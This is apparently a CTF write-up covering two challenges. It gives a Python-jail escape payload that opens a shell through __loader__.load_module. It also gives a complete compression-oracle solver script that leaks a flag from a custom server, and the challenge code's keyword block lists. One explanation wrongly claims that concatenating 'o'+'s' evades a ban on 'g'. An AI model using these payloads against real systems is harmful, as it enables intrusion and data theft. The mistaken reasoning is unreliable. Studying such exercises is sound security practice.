---
title: "Claw the Flag CTF Writeups"
date: "2025-12-28"
---
This writeup covers two challenges from the Claw the Flag CTF: **pyjail** and **F.R.E.E.D.O.M**. Both challenges involved clever exploitation techniques to bypass restrictions and retrieve flags.

---

## Challenge 1: pyjail

### Challenge Overview

A Python jail challenge that restricts certain characters, keywords, and dangerous functions through static analysis and runtime audit hooks.

### The Code

**server.py:**

```python
import sys

def hook(event, _):
    blacklist = ["import", "ctypes", "open"]
    if event in blacklist:
        print(f"Event not allowed: {event}")
        exit()

def check_code(code):
    banned_chars = ["[", "]", "g", "@"]
    banned_words = [
        "builtins",
        "breakpoint",
        "exec",
        "eval",
        "attr",
        "import",
        "class",
        "bases",
        "f_back",
        "traceback",
        "globals",
        "popen",
        "license",
        "help",
    ]

    try:
        code.encode("ascii")
    except UnicodeEncodeError:
        return False

    for c in code:
        if c in banned_chars:
            return False

    for word in banned_words:
        if word in code.lower():
            return False
    return True

if __name__ == "__main__":
    while True:
        print("Welcom to your good ol' pyjail!")
        inp = input("> ")

        if not check_code(inp):
            print("nope")
            continue

        code = compile(inp, "<string>", "single")
        sys.addaudithook(hook)

        try:
            exec(code, dict())
        except:
            pass
```

### Vulnerability Analysis

The key insight is that while many common escape methods are blocked, the `__loader__` object remains accessible. This object has a `load_module()` method that can dynamically import modules without triggering the audit hook's import restriction (since the hook only catches the string "import" as an event, not the underlying module loading mechanism).

### Exploitation

The bypass is surprisingly simple:

```python
__loader__.load_module('o'+'s').system('sh')
```

**Why this works:**
- `__loader__` is available in the execution context
- String concatenation `'o'+'s'` bypasses the character 'g' ban in "os"
- `load_module()` doesn't trigger the audit hook in the same way as `import`
- Once we have the `os` module, we can call `system('sh')` for shell access

### Flag Retrieval

After gaining shell access, we simply locate and read the flag:

```bash
$ find / -name flag.txt 2>/dev/null
$ cat /path/to/flag.txt
```

---

## Challenge 2: F.R.E.E.D.O.M

### Challenge Overview

F.R.E.E.D.O.M is a custom protocol server implementing a minimal filesystem with various commands. The flag is stored in `/root/flag.txt`, and the server has special logic that XORs the flag with random bytes if it detects the flag in the response—making direct exfiltration impossible.

### Source Code

The challenge consists of three files: the server implementation, a client, and our exploit.

**server.py:**

<details>
<summary>Click to expand full server code</summary>

```python
#!/usr/bin/env python3
import os
import selectors
import shlex
import socket
import time
import zlib

CMD_LEN = 20
LEN_LEN = 4
MAX_CONNECTIONS = 500
TIMEOUT_SECONDS = 180


class Connection:
    def __init__(self, sock, addr, server):
        self.sock = sock
        self.addr = addr
        self.server = server
        self.sock.setblocking(False)

        self._rbuf = bytearray()
        self._sbuf = bytearray()
        self._expected_payload_len = None
        self._command = None
        self.stage = "cmd"

        self.env = {
            "HOME": "/home/user",
            "PWD": "/home/user",
        }

        self.fs = {
            "root": {"flag.txt": {"__file__": os.getenv("FLAG", "Cybears{fake_flag}")}},
            "home": {
                "user": {
                    "file.txt": {"__file__": "hello world\n"},
                    "protosettings": {"__file__": "low_bandwidth=0\n"},
                }
            },
        }

        self.wd = ["home", "user"]
        self.last_active = time.monotonic()

    def LB_enabled(self) -> bool:
        node = self.get_dir(self.resolve_path("protosettings"))
        if isinstance(node, dict) and "__file__" in node:
            for line in node["__file__"].splitlines():
                if line.strip().startswith("low_bandwidth="):
                    return line.strip().split("=", 1)[1] == "1"
        return True

    def fileno(self):
        return self.sock.fileno()

    def close(self):
        try:
            self.server.selector.unregister(self.sock)
        except Exception:
            pass
        try:
            self.sock.close()
        except Exception:
            pass
        self.server.active_connections.discard(self)

    def on_readable(self):
        self.last_active = time.monotonic()
        try:
            data = self.sock.recv(4096)
        except (BlockingIOError, ConnectionResetError):
            self.close()
            return
        if not data:
            self.close()
            return

        self._rbuf += data
        while True:
            if self.stage == "cmd":
                if len(self._rbuf) < CMD_LEN:
                    break
                self._command = self._rbuf[:CMD_LEN].decode(errors="ignore").strip()
                del self._rbuf[:CMD_LEN]
                self.stage = "len"

            if self.stage == "len":
                if len(self._rbuf) < LEN_LEN:
                    break
                self._expected_payload_len = int.from_bytes(self._rbuf[:LEN_LEN], "big")
                del self._rbuf[:LEN_LEN]
                if not (0 <= self._expected_payload_len <= 10_000_000):
                    self.close()
                    return
                self.stage = "payload"

            if self.stage == "payload":
                if len(self._rbuf) < self._expected_payload_len:
                    break
                raw_payload = self._rbuf[: self._expected_payload_len]
                del self._rbuf[: self._expected_payload_len]

                payload = raw_payload
                if self.LB_enabled():
                    try:
                        payload = zlib.decompress(raw_payload)
                    except Exception:
                        payload = b""

                try:
                    resp, _ = self.process_request(self._command, payload)
                except:
                    resp = "error"

                out_data = resp.encode()
                if self.LB_enabled():
                    out_data = zlib.compress(out_data)

                if self.fs["root"]["flag.txt"]["__file__"] in resp:
                    out_data = bytes(
                        a ^ b for a, b in zip(out_data, os.urandom(len(out_data)))
                    )

                self._sbuf += len(out_data).to_bytes(4, "big") + out_data
                self.server.selector.modify(
                    self.sock, selectors.EVENT_READ | selectors.EVENT_WRITE, self
                )

                self._command = None
                self._expected_payload_len = None
                self.stage = "cmd"
                continue
            break

    def on_writable(self):
        self.last_active = time.monotonic()
        if not self._sbuf:
            self.server.selector.modify(self.sock, selectors.EVENT_READ, self)
            return
        try:
            sent = self.sock.send(self._sbuf)
            del self._sbuf[:sent]
        except (BlockingIOError, BrokenPipeError):
            self.close()
            return

        if not self._sbuf:
            try:
                self.server.selector.modify(self.sock, selectors.EVENT_READ, self)
            except Exception:
                pass

    def resolve_path(self, path):
        parts = (
            path.strip("/").split("/")
            if path.startswith("/")
            else self.wd + path.split("/")
        )
        return [p for p in parts if p]

    def get_dir(self, parts):
        node = self.fs
        for p in parts:
            if isinstance(node, dict) and p in node:
                node = node[p]
            else:
                return None
        return node

    def resolve_links(self, parts, depth=0, maxdepth=3):
        if depth > maxdepth:
            return parts
        node = self.get_dir(parts)
        if isinstance(node, dict) and "__link__" in node:
            return self.resolve_links(node["__link__"], depth + 1, maxdepth)
        return parts

    def expand_vars(self, text):
        for k, v in self.env.items():
            text = text.replace(f"${k}", v)
        return text

    def process_request(self, command, data):
        args = []
        if data:
            try:
                args = shlex.split(self.expand_vars(data.decode()))
            except Exception:
                args = []

        res = ""
        match command:
            case "cd":
                target = args[0] if args else self.env["HOME"]
                parts = self.resolve_path(target)
                node = self.get_dir(parts)
                if isinstance(node, dict):
                    self.wd = parts
                    self.env["PWD"] = "/" + "/".join(self.wd)
                else:
                    res = f"cd: no such directory: {target}"
            case "pwd":
                res = "/" + "/".join(self.wd)
            case "echo":
                res = self.expand_vars(" ".join(args))
            case "ls":
                parts = self.resolve_path(args[0]) if args else self.wd
                node = self.get_dir(parts)
                if (
                    isinstance(node, dict)
                    and "__file__" not in node
                    and "__link__" not in node
                ):
                    res = "\n".join(node.keys())
                else:
                    res = (
                        f"ls: cannot access '{args[0]}': Not a directory"
                        if args
                        else "ls: error reading directory"
                    )
            case "help":
                res = "Commands: cd, ls, pwd, echo, help, ln, lnh, set"
            case "set":
                if len(args) < 2:
                    res = "usage: set VAR FILE"
                else:
                    var, target = args
                    parts = self.resolve_path(target)
                    if "root" in parts or "root" in self.resolve_links(parts):
                        res = f"set: {target}: Permission denied"
                    else:
                        node = self.get_dir(self.resolve_links(parts))
                        if isinstance(node, dict) and "__file__" in node:
                            self.env[var] = node["__file__"].strip()
                        elif isinstance(node, dict):
                            res = f"set: {target}: Is a directory"
                        else:
                            res = f"set: {target}: No such file"
            case "LB":
                try:
                    self.fs["home"]["user"]["protosettings"] = {
                        "__file__": f"low_bandwidth={args[0]}\n"
                    }
                except:
                    res = "usage: LB 0|1"
            case "ln":
                if len(args) != 2:
                    res = "usage: ln TARGET LINKNAME"
                else:
                    target_parts = self.resolve_path(args[0])
                    link_parts = self.resolve_path(args[1])
                    parent = self.get_dir(link_parts[:-1])
                    if not isinstance(parent, dict):
                        res = f"ln: cannot create link at '{args[1]}'"
                    else:
                        parent[link_parts[-1]] = {"__link__": target_parts}
            case "lnh":
                if len(args) != 1:
                    res = "usage: lnh TARGET"
                else:
                    target = args[0]
                    if "root" in target:
                        res = "cannot link to restricted files"
                    else:
                        target_node = self.get_dir(
                            self.resolve_links(self.resolve_path(target))
                        )
                        link_parts = self.resolve_path(target + ".h")
                        parent = self.get_dir(link_parts[:-1])
                        if not isinstance(parent, dict):
                            res = f"lnh: cannot create link at '{target+'.h'}'"
                        elif (
                            isinstance(target_node, dict) and "__file__" in target_node
                        ):
                            parent[link_parts[-1]] = {
                                "__file__": target_node["__file__"]
                            }
                        else:
                            res = "lnh: invalid target"
        return res, res


class FreedomServer:
    def __init__(self, host="0.0.0.0", port=65432):
        self.host = host
        self.port = port
        self.lsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.lsock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.lsock.setblocking(False)
        self.selector = selectors.DefaultSelector()
        self.active_connections = set()

    def start(self):
        self.lsock.bind((self.host, self.port))
        self.lsock.listen(MAX_CONNECTIONS)
        print(f"Server Listening on {self.host}:{self.port}")
        self.selector.register(self.lsock, selectors.EVENT_READ, self.accept)

        try:
            while True:
                events = self.selector.select(timeout=1)
                now = time.monotonic()

                for conn in list(self.active_connections):
                    if now - conn.last_active > TIMEOUT_SECONDS:
                        conn.close()

                for key, mask in events:
                    callback = key.data
                    if callback == self.accept:
                        callback()
                    else:
                        conn = callback
                        if mask & selectors.EVENT_READ:
                            conn.on_readable()
                        if mask & selectors.EVENT_WRITE:
                            conn.on_writable()
        except KeyboardInterrupt:
            print("Server shutting down.")
        finally:
            for conn in list(self.active_connections):
                conn.close()
            self.selector.close()
            self.lsock.close()

    def accept(self):
        try:
            client_sock, addr = self.lsock.accept()
            if len(self.active_connections) >= MAX_CONNECTIONS:
                client_sock.close()
                return
            conn = Connection(client_sock, addr, self)
            self.active_connections.add(conn)
            self.selector.register(client_sock, selectors.EVENT_READ, conn)
            print(f"Connection from {addr}")
        except BlockingIOError:
            return


if __name__ == "__main__":
    FreedomServer().start()
```

</details>

**client.py:**

<details>
<summary>Click to expand client code</summary>

```python
#!/usr/bin/env python3
import socket
import ssl

class FreedomClient:
    def __init__(self, host="localhost", port=65432, verify=True):
        self.host = host
        self.port = port
        self.socket = None
        self.verify = verify

    def connect(self):
        def _create_socket():
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((self.host, self.port))
            return sock
        
        self.socket = _create_socket()
        
        try:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            self.socket = context.wrap_socket(self.socket, server_hostname=self.host)
        except ssl.SSLError:
            self.socket.close()
            self.socket = _create_socket()
            print("[!] SSL failed, using plain TCP")

    def recv_exact(self, n):
        buf = b""
        while len(buf) < n:
            chunk = self.socket.recv(n - len(buf))
            if not chunk:
                raise ConnectionError("Socket closed")
            buf += chunk
        return buf

    def send_message(self, cmd, message):
        if self.socket:
            cmd_fixed = cmd.ljust(20)[:20].encode()
            data = message.encode() if isinstance(message, str) else message

            self.socket.sendall(cmd_fixed)
            self.socket.sendall(len(data).to_bytes(4, "big"))
            self.socket.sendall(data)

            try:
                length_data = self.recv_exact(4)
                response_length = int.from_bytes(length_data, "big")
                response_data = self.recv_exact(response_length)
            except ConnectionError:
                return None

            return response_data.decode(errors="replace")

        return None

    def close(self):
        if self.socket:
            self.socket.close()


if __name__ == "__main__":
    client = FreedomClient(verify=False)
    client.connect()

    print("Welcome to the F.R.E.E.D.O.M protocol")
    print("The only jail is in your mind...")
    try:
        while True:
            cmd = input("Command: ").strip()
            if not cmd:
                continue

            payload = input("> ")

            response = client.send_message(cmd, payload)
            if response:
                print(response)
            else:
                print("No response (server may have closed the connection).")

    except (KeyboardInterrupt, EOFError):
        print("\nExiting...")
    finally:
        client.close()
```

</details>

### Server Analysis

Key observations from the server code:

1. **Flag Protection Mechanism:**
```python
if self.fs["root"]["flag.txt"]["__file__"] in resp:
    out_data = bytes(
        a ^ b for a, b in zip(out_data, os.urandom(len(out_data)))
    )
```

2. **Low Bandwidth Mode:** The server supports compression via zlib when `low_bandwidth=1` is set in the protosettings file.

3. **File System Commands:** `ln` (symbolic link), `lnh` (hard link), `set` (read file into environment variable), `echo` (expand variables).

### Vulnerability: Compression Oracle Attack

The vulnerability lies in the combination of:
- Compression being applied to responses
- The ability to control part of the input (our guess)
- Access to the compressed output size
- The flag being readable into an environment variable

This creates a classic **compression oracle** scenario. When data contains repeating patterns, compression algorithms like zlib achieve better compression ratios. If our guess matches part of the flag, the combined data compresses more efficiently.

### Attack Strategy

1. **Setup Phase:**
   - Create a symbolic link: `ln /root/flag.txt /home/user/myflag`
   - Create a hard link: `lnh /home/user/myflag` → creates `myflag.h`
   - Read flag into variable: `set FLAG /home/user/myflag.h`
   - Enable compression: `LB 1`

2. **Oracle Query:**
   For each character position, test all possible characters by sending:
   ```
   echo "known_prefix + guess_char repeated $FLAG"
   ```
   
3. **Size Comparison:**
   The correct character will result in the smallest compressed output because it creates repetition with the actual flag content.

### Exploit Implementation

**solver.py:**

```python
#!/usr/bin/env python3
import socket
import zlib
import string

class OracleClient:
    def __init__(self, host="localhost", port=65432):
        self.host = host
        self.port = port
        self.socket = None

    def connect(self):
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.connect((self.host, self.port))

    def recv_exact(self, n):
        buf = b""
        while len(buf) < n:
            chunk = self.socket.recv(n - len(buf))
            if not chunk:
                raise ConnectionError("Socket closed")
            buf += chunk
        return buf

    def send_message(self, cmd, message, compress_input=False):
        cmd_fixed = cmd.ljust(20)[:20].encode()
        data = message.encode() if isinstance(message, str) else message
        
        if compress_input:
            data = zlib.compress(data)

        self.socket.sendall(cmd_fixed)
        self.socket.sendall(len(data).to_bytes(4, "big"))
        self.socket.sendall(data)

        length_data = self.recv_exact(4)
        response_length = int.from_bytes(length_data, "big")
        response_data = self.recv_exact(response_length)
        
        return response_length, response_data

    def close(self):
        if self.socket:
            self.socket.close()


def extract_flag_with_oracle(host, port):
    print("[*] Starting compression oracle attack...")
    
    client = OracleClient(host, port)
    client.connect()
    
    print("[*] Setting up file system...")
    
    # Create symlink to flag
    resp = client.send_message("ln", "/root/flag.txt /home/user/myflag", compress_input=False)
    print(f"[*] Symlink to flag.txt: {resp}")
    
    # Create hard link
    resp = client.send_message("lnh", "/home/user/myflag", compress_input=False)
    print(f"[*] Hard link creation: {resp}")
    
    # Read flag into environment variable
    resp = client.send_message("set", "FLAG /home/user/myflag.h", compress_input=False)
    print(f"[*] Set FLAG: {resp}")
    
    # Verify we can access the flag
    size, data = client.send_message("echo", "$FLAG", compress_input=False)
    print(f"[*] Flag verification (should not be empty): size={size}, data={data[:50]}")
    
    if size == 0:
        print("[!] ERROR: Failed to read flag into variable!")
        client.close()
        return "ERROR"
    
    # Enable compression
    client.send_message("LB", "1", compress_input=False)
    
    flag = "Cybears{"
    charset = string.ascii_letters + string.digits + "_{}-!@#$%^&*()"
    
    while not flag.endswith("}"):
        best_char = None
        min_size = float('inf')
        
        print(f"\n[*] Current flag: {flag}")
        print(f"[*] Testing characters...")
        
        size_map = {}
        
        for char in charset:
            test_string = flag + char
            
            # Repeat our guess multiple times to amplify compression differences
            repeated = (test_string + " ") * 20
            payload = f"{repeated}$FLAG"
            
            try:
                # Test multiple times for stability
                sizes = []
                for _ in range(3):
                    size, data = client.send_message("echo", payload, compress_input=True)
                    sizes.append(size)
                
                # Use median to reduce noise
                avg_size = sorted(sizes)[1]
                size_map[char] = avg_size
                
                if avg_size < min_size:
                    min_size = avg_size
                    best_char = char
                    
            except Exception as e:
                print(f"    [!] Error testing '{char}': {e}")
                # Reconnect and retry
                try:
                    client.close()
                except:
                    pass
                client = OracleClient(host, port)
                client.connect()
                client.send_message("ln", "/root/flag.txt /home/user/myflag", compress_input=False)
                client.send_message("lnh", "/home/user/myflag", compress_input=False)
                client.send_message("set", "FLAG /home/user/myflag.h", compress_input=False)
                client.send_message("LB", "1", compress_input=False)
                
                sizes = []
                for _ in range(3):
                    size, data = client.send_message("echo", payload, compress_input=True)
                    sizes.append(size)
                avg_size = sorted(sizes)[1]
                size_map[char] = avg_size
                if avg_size < min_size:
                    min_size = avg_size
                    best_char = char
        
        # Show top candidates
        sorted_sizes = sorted(size_map.items(), key=lambda x: x[1])
        print(f"    Top 10 candidates (smallest compressed size):")
        for i, (char, size) in enumerate(sorted_sizes[:10]):
            diff = size - sorted_sizes[0][1]
            marker = " <-- BEST" if i == 0 else f" (+{diff})"
            print(f"      '{char}': {size} bytes{marker}")
        
        # Check for ambiguous results
        if len(sorted_sizes) > 1 and sorted_sizes[1][1] - sorted_sizes[0][1] < 1:
            print(f"    [!] WARNING: Ambiguous result, size diff = {sorted_sizes[1][1] - sorted_sizes[0][1]}")
            print(f"    [!] Continuing anyway with best guess...")
        
        if best_char:
            flag += best_char
            print(f"    -> Selected: '{best_char}' (size: {min_size})")
        else:
            print("    -> Could not determine next character!")
            break
        
        # Safety check to prevent infinite loops
        if len(flag) > 100:
            break
    
    client.close()
    return flag


if __name__ == "__main__":
    HOST = "freedom.ctf.clawtheflag.com"
    PORT = 1337
    
    flag = extract_flag_with_oracle(HOST, PORT)
    print(f"\n[+] FINAL FLAG: {flag}")
```

The solver script automates the character-by-character extraction:

```python
def extract_flag_with_oracle(host, port):
    flag = "Cybears{"  # Known prefix
    charset = string.ascii_letters + string.digits + "_{}-!@#$%^&*()"
    
    # Setup filesystem and compression
    client.send_message("ln", "/root/flag.txt /home/user/myflag")
    client.send_message("lnh", "/home/user/myflag")
    client.send_message("set", "FLAG /home/user/myflag.h")
    client.send_message("LB", "1")
    
    while not flag.endswith("}"):
        best_char = None
        min_size = float('inf')
        
        for char in charset:
            test_string = flag + char
            repeated = (test_string + " ") * 20
            payload = f"{repeated}$FLAG"
            
            # Test multiple times for stability
            sizes = []
            for _ in range(3):
                size, data = client.send_message("echo", payload, compress_input=True)
                sizes.append(size)
            
            avg_size = sorted(sizes)[1]  # Use median
            
            if avg_size < min_size:
                min_size = avg_size
                best_char = char
        
        flag += best_char
    
    return flag
```

### Key Techniques

- **Repetition Amplification:** Repeating the guess 20 times amplifies the compression difference
- **Statistical Stability:** Taking median of 3 measurements reduces noise
- **Gradual Reconstruction:** Building the flag character-by-character from left to right

### Flag Retrieval

Running the exploit against the server:

```bash
python3 solver.py
```

The script gradually reveals the flag by observing compressed response sizes, successfully bypassing the XOR protection mechanism.

---

## Lessons Learned

### pyjail
- Python's introspection capabilities provide many escape vectors
- Audit hooks can be bypassed if they only check for string patterns
- The `__loader__` object is often overlooked in sandbox implementations

### F.R.E.E.D.O.M
- Side-channel attacks can defeat even strong encryption/obfuscation
- Compression and encryption should never be mixed without careful consideration
- Oracle attacks remain powerful when timing or size information leaks

---

## Conclusion

Both challenges demonstrated creative exploitation techniques: pyjail required understanding Python's module loading internals, while F.R.E.E.D.O.M showcased a practical compression oracle attack. These CTF challenges highlight the importance of defense in depth and understanding subtle information leakage vectors.

Thanks to the CTF organizers for these excellent challenges!
